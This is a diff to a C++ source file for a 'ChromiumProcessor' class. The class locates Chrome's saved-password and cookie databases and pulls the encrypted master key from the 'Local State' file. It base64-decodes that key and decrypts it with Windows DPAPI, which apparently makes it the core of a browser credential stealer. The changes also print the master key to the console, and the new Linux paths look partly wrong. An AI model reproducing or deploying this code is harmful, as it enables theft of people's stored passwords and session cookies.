@@ -1,19 +1,17 @@
 #include "chromium_processor.hpp"
 
-#if defined(__WIN64__)
-
 ChromiumProcessor::ChromiumProcessor()
 {
-    //TCHAR username[255];
-    //DWORD username_len=255;
-    //GetUserName((TCHAR*)username, &username_len);
-    userdata_path=string("%LocalAppData%\\Google\\Chrome\\User Data");
+#if defined(__WIN64__)
+    string appDataLocal_path=std::experimental::filesystem::temp_directory_path().parent_path().parent_path().string();
+    userdata_path=appDataLocal_path+string("\\Google\\Chrome\\User Data");
     pass_path=userdata_path+string("\\Default\\Login Data");
-    //pass_path += username;
-    //pass_path += _T("\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data");
     cookies_path=userdata_path+string("\\Default\\Cookies");
-    //cookies_path += username;
-    //cookies_path += _T("\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies");
+#elif defined(__linux__)
+    userdata_path=
+    pass_path="~/.config/google-chrome/Default/User Data";
+    cookies_path="~/.config/google-chrome/Default/Cookies";
+#endif
 }
 
 stringstream ChromiumProcessor::getChromiumPW()
@@ -175,8 +173,7 @@ stringstream ChromiumProcessor::getChromiumCookies()
 
 unsigned char *ChromiumProcessor::getMasterKey()
 {
-    string LocalStateFile_path = userdata_path;
-
+    string LocalStateFile_path=userdata_path, stMasterKey;
     if(LocalStateFile_path.find("Opera")!=string::npos)
     {
         LocalStateFile_path += "\\Opera Stable\\Local State";
@@ -185,25 +182,19 @@ unsigned char *ChromiumProcessor::getMasterKey()
     {
         LocalStateFile_path += "\\Local State";
     }
-
-    unsigned char bMasterKey[] = { };
-
     if(!experimental::filesystem::exists(LocalStateFile_path))
     {
         cerr<<"file don't exists: "<<LocalStateFile_path<<endl;
         return 0;
     }
-
     if (LocalStateFile_path != prevBrowser_path)
     {
-        prevBrowser_path = LocalStateFile_path;
+        prevBrowser_path=LocalStateFile_path;
     }
     else
     {
         return prevMasterKey;
     }
-
-    string masterKey;
 
     json_error_t err;
     json_t *LocalState=json_load_file(LocalStateFile_path.c_str(), 0, &err);
@@ -224,26 +215,18 @@ unsigned char *ChromiumProcessor::getMasterKey()
         cout<<os_crypt;
         if(json_object_get(os_crypt, "encrypted_key")->type == JSON_STRING)
         {
-            masterKey=json_string_value(json_object_get(os_crypt, "encrypted_key"));
-            cout<<masterKey;
+            stMasterKey=json_string_value(json_object_get(os_crypt, "encrypted_key"));
+            cout<<stMasterKey;
         }
     }
 
-    masterKey = base64_decode(masterKey);
+    stMasterKey=base64_decode(stMasterKey);
+    cout<<stMasterKey;
 
-    unsigned int len=masterKey.length()-5;
-    char *bRawMasterKey = new char[len];
-    memcpy(bRawMasterKey, masterKey.data()+5, len);
+    unsigned int len=stMasterKey.length()-5;
+    char *bRawMasterKey=new char[len];
+    memcpy(bRawMasterKey, stMasterKey.data()+5, len);
 
     DATA_BLOB kkk =DPAPIDecrypt((unsigned char *)(bRawMasterKey), len);
     return kkk.pbData;
 }
-
-#elif defined(__linux__)
-
-stringstream get_chrome_pass(sqlite3* db)
-{
-    return stringstream(string(""));
-}
-
-#endif
